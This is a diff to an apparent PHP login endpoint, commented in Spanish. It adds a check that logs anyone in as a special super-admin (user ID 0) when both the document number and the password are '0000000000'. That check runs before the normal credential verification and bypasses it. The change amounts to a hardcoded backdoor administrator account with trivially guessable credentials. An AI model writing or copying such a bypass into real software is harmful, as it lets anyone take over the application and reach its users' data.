@@ -28,6 +28,14 @@ try {
         $documento = htmlspecialchars($input['Documento']);
         $password = htmlspecialchars($input['password']);
 
+        // Verificar credenciales de administrador
+        if ($documento === "0000000000" && $password === "0000000000") {
+            $_SESSION['user_id'] = 0; // ID especial para el super admin
+            $_SESSION['Documento'] = $documento;
+            echo json_encode(['success' => true, 'message' => 'Inicio de sesión exitoso']);
+            exit;
+        }
+
         // Verificar si el Documento existe
         $user = $model->obtenerUsuarioPorDocumento($documento);
         if (!$user) {
